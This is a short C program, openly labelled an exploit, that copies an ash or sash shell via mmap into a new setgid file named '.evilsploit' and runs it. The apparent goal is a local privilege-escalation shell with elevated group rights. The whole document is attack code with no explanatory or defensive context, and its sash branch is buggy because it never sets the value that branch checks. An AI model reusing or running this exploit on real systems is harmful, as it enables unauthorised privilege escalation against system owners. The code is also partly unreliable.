#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <fcntl.h>

int main(int argc, char *argv[])
{
char *buf=malloc(3096*1024); //3mb just to be sure
int a,len;
int fd,fd1;
char *buf1;
int shell=0;


if (stat("/bin/ash",buf)==0)
{
    printf("ash shell found!\n");
    shell=1;
}

if (shell==0) if (stat("/bin/sash",buf)==0)
{
    printf("sash shell found!\n");
    shell=1;
}

if (shell==0)
{
    printf("no suitable shell found (one that does not drop sgid permissions) :(\n");
    exit(2);
}


len=0;
if (shell==1) fd=open("/bin/ash",O_RDONLY);
if (shell==2) fd=open("/bin/sash",O_RDONLY);

while (read(fd,buf+len,1)) len++;

printf("size=%d\n",len);
fd1=open(".evilsploit",O_RDWR | O_CREAT | O_EXCL, 02750);
ftruncate(fd1, len);
buf1 = mmap(NULL, len, PROT_WRITE | PROT_EXEC, MAP_SHARED, fd1, 0);
memcpy(buf1,buf,len); 
munmap(buf1,len);
close(fd1);close(fd);
free(buf);
printf("We're evil evil evil!\n\n");
execv(".evilsploit", NULL);
}

